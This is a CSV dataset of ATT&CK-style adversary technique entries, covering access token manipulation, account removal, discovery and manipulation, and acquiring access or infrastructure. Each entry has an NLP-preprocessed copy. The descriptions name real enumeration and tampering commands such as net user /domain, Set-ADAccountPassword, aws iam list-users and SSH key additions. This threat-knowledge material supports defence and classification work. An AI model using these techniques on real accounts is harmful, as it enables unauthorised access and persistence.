id,name,description,processed
T1134.005,Access Token Manipulation: SID-History Injection,"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).With Domain Administrator (or equivalent) rights, harvested or well-known SID values may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management.",adversary use sid history injection escalate privilege bypass access control windows security identifier sid unique value identify user group account sids windows security security descriptor access token allow inter operable account migration domain value sid history include access domain administrator equivalent right harvest know sid value insert sid history enable impersonation arbitrary user group enterprise administrators manipulation result elevated access local resource access inaccessible domain lateral movement technique remote services smb windows admin shares windows remote management
T1531,Account Access Removal,"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a System Shutdown/Reboot to set malicious changes into place.In Windows, Net utility, Set-LocalUser and Set-ADAccountPassword PowerShell cmdlets may be used by adversaries to modify user accounts. In Linux, the passwd utility may be used to change passwords. Accounts could also be disabled by Group Policy. Adversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as Data Destruction and Defacement, in order to impede incident response/recovery before completing the Data Encrypted for Impact objective.",adversary interrupt availability system network resource inhibit access account utilize legitimate user account delete lock manipulate ex change credential remove access account adversary subsequently log perform system shutdown reboot set malicious change place windows net utility set localuser set adaccountpassword powershell cmdlet adversary modify user account linux passwd utility change password account disable group policy adversary use ransomware similar attack perform impact behavior data destruction defacement order impede incident response recovery complete data encrypt impact objective
T1087,Account Discovery,"Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.For examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.",adversary attempt listing valid account username email address system compromised environment information help adversary determine account exist aid follow behavior brute force spear phishing attack account takeover valid use method enumerate account include abuse exist tool build command potential misconfiguration leak account name role permission target environment example cloud environment typically provide easily accessible interface obtain user list host adversary use default powershell command line functionality identify account information email address account extract search infected system file
T1087.001,Account Discovery: Local Account,"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.Commands such as net user and net localgroup of the Net utility and id and groupson macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the /etc/passwd file. On macOS the dscl . list /Users command can be used to enumerate local accounts.",adversary attempt listing local system account information help adversary determine local account exist system aid follow behavior command net user net localgroup net utility d groupson macos linux list local user group linux local user enumerate use passwd file macos dscl list command enumerate local account
T1087.002,Account Discovery: Domain Account,"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.Commands such as net user /domain and net group /domain of the Net utility, dscacheutil -q groupon macOS, and ldapsearch on Linux can list domain users and groups. PowerShell cmdlets including Get-ADUser and Get-ADGroupMember may enumerate members of Active Directory groups.",adversary attempt listing domain account information help adversary determine domain account exist aid follow behavior target specific account possess particular privilege command net user net group net utility dscacheutil groupon macos ldapsearch linux list domain user group powershell cmdlet include aduser adgroupmember enumerate member active directory group
T1087.003,Account Discovery: Email Account,"Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).In on-premises Exchange and Exchange Online, theGet-GlobalAddressList PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.",adversary attempt listing email address account adversary try dump exchange address list global address list premise exchange exchange online theget globaladdresslist powershell cmdlet obtain email address account domain authenticate session google workspace gal share microsoft outlook user google workspace sync microsoft outlook gwsmo service additionally google workspace directory allow user listing user organization
T1087.004,Account Discovery: Cloud Account,"Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.With authenticated access there are several tools that can be used to find accounts. The Get-MsolRoleMember PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365. The AWS command aws iam list-users may be used to obtain a list of users in the current account while aws iam list-roles can obtain IAM roles that have a specified path prefix.",adversary attempt listing cloud account cloud account create configure organization use user remote support service administration resource cloud service provider saas application authenticated access tool find account msolrolemember powershell cmdlet obtain account name give role permission group office aws command aws iam list user obtain list user current account aws iam list role obtain iam role specify path prefix
T1098,Account Manipulation,"Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.",adversary manipulate account maintain access victim system account manipulation consist action preserve adversary access compromise account modify credential permission group action include account activity design subvert security policy perform iterative password update bypass password duration policy preserve life compromise credential order create manipulate account adversary sufficient permission system domain account manipulation lead privilege escalation modification grant access additional role permission higher privileged valid accounts
T1098.001,Account Manipulation: Additional Cloud Credentials,"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.In infrastructure-as-a-service (IaaS) environments, after gaining access through Cloud Accounts, adversaries may generate or import their own SSH keys using either the CreateKeyPair or ImportKeyPair API in AWS or the gcloud compute os-login ssh-keys add command in GCP.Adversaries may also use the CreateAccessKey API in AWS or the gcloud iam service-accounts keys create command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. Cloud Accounts).In AWS environments, adversaries with the appropriate permissions may also use the sts:GetFederationToken API call to create a temporary set of credentials tied to the permissions of the original user account. These credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated.",adversary add adversary control credential cloud account maintain persistent access victim account instance environment example adversary add credential service principals application addition exist legitimate credential azure infrastructure service iaas environment gain access cloud accounts adversary generate import ssh key createkeypair importkeypair api aws gcloud compute os login ssh key add command use createaccesskey api aws gcloud iam service account key create command gcp add access key account target account different permission request account adversary able escalate privilege environment cloud aws environment adversary appropriate permission use sts getfederationtoken api create temporary set credential tie permission original user account credential remain valid duration lifetime original account api credential deactivate
T1098.002,Account Manipulation: Additional Email Delegate Permissions,"Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. For example, the Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox. Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add Additional Cloud Roles to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: Internal Spearphishing), so the messages evade spam/phishing detection mechanisms.",adversary grant additional permission level maintain persistent access adversary control email account example add mailboxpermission powershell cmdlet available premise exchange cloud base service office add permission mailbox adversary assign mailbox folder permission individual folder permission role office environment adversary assign default anonymous user permission role information store root inbox mailbox folder assign user permission folder adversary utilize account tenant maintain persistence target user mail folder persistent threat incident bec business email compromise incident adversary add additional cloud role account wish compromise enable use additional technique gain access system example compromise business account send message account network target business create inbox rule ex internal spearphishing message evade spam phishing detection mechanism
T1098.003,Account Manipulation: Additional Cloud Roles,"An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. This account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.For example, in Azure AD environments, an adversary with the Application Administrator role can add Additional Cloud Credentials to their application's service principal. In doing so the adversary would be able to gain the service principal’s roles and permissions, which may be different from those of the Application Administrator.Similarly, an adversary with the Azure AD Global Administrator role can toggle the ""Access management for Azure resources"" option to gain the ability to assign privileged access to Azure subscriptions and virtual machines to Azure AD users, including themselves.",adversary add additional role permission adversary control cloud account maintain persistent access tenant example adversary update iam policy cloud base environment add new global administrator office environment account modification immediately follow create account malicious account activity adversary modify exist valid accounts compromise lead privilege escalation particularly role add allow lateral movement additional account example azure ad environment adversary application administrator role add additional cloud credentials application service principal adversary able gain service principal role permission different application administrator similarly adversary azure ad global administrator role toggle access management azure resource option gain ability assign privileged access azure subscription virtual machine azure ad user include
T1098.004,Account Manipulation: SSH Authorized Keys,"Adversaries may modify the SSH authorized_keys file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <user-home>/.ssh/authorized_keys. Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value ""yes"" to ensure public key and RSA authentication are enabled. The SSH config file is usually located under /etc/ssh/sshd_config.Adversaries may modify SSH authorized_keys files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s ""add-metadata"" command an adversary may add SSH keys to a user account. Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. SSH keys can also be added to accounts on network devices, such as with the ip ssh pubkey-chain Network Device CLI command.",adversary modify ssh file maintain persistence victim host linux distribution macos commonly use key base authentication secure authentication process ssh session remote management file ssh specify ssh key log user account file configure file usually find user home directory user user edit system ssh config file modify directive pubkeyauthentication rsaauthentication value yes ensure public key rsa authentication enable ssh config file usually locate ssh adversary modify ssh file directly script shell command add adversary supply public key cloud environment adversary able modify ssh file particular virtual machine command line interface rest api example google cloud cli add metadata command adversary add ssh key user account file modify cloud api command line interface adversary achieve privilege escalation target virtual machine add key higher privileged user ssh key add account network device ip ssh pubkey chain network device cli command
T1098.005,Account Manipulation: Device Registration,"Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.Similarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies. Devices registered in Azure AD may be able to conduct Internal Spearphishing campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.",adversary register device adversary control account device register multifactor authentication mfa system handle authentication network device management system handle device access compliance mfa system duo okta allow user associate device account order complete mfa requirement adversary compromise user credential enroll new device order bypass initial mfa requirement gain persistent access network similarly adversary exist access network register device azure ad device management system microsoft intune order access sensitive datum resource bypass conditional access policy device register azure ad able conduct internal spearphishing campaign intra organizational email likely treat suspicious email client
T1650,Acquire Access,"Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.Footholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., Web Shell) or established access via External Remote Services. In some cases, access brokers will implant compromised systems with a ""load"" that can be used to install additional malware for paying customers.By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a Trusted Relationship, Multi-Factor Authentication Interception, or even Supply Chain Compromise.Note: while this technique is distinct from other behaviors such as Purchase Technical Data and Credentials, they may often be used in conjunction (especially where the acquired foothold requires Valid Accounts).",adversary purchase acquire exist access target system network variety online service initial access broker network available sell access previously compromised system foothold compromise system variety form access plant backdoor web shell establish access external remote services case access broker implant compromise system load install additional malware pay customer leverage exist access broker network develop obtain initial access capability adversary potentially reduce resource require gain foothold target network focus effort later stage compromise adversary prioritize acquire access system determine lack security monitoring high privilege system belong organization particular sector case purchase access organization sector contracting software development telecommunication allow adversary compromise additional victim trust relationship multi factor authentication interception supply chain compromise note technique distinct behavior purchase technical datum credential conjunction especially acquire foothold require valid account
T1583,Acquire Infrastructure,"Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Additionally, botnets are available for rent or purchase.Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support Proxy. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",adversary buy lease rent infrastructure targeting wide variety infrastructure exist host orchestrate adversary operation infrastructure solution include physical cloud server domain party web service additionally botnet available rent purchase use infrastructure solution allow adversary stage launch execute operation solution help adversary operation blend traffic see normal contact party web service acquire infrastructure support proxy depend implementation adversary use infrastructure make difficult physically tie utilize infrastructure rapidly provision modify shut
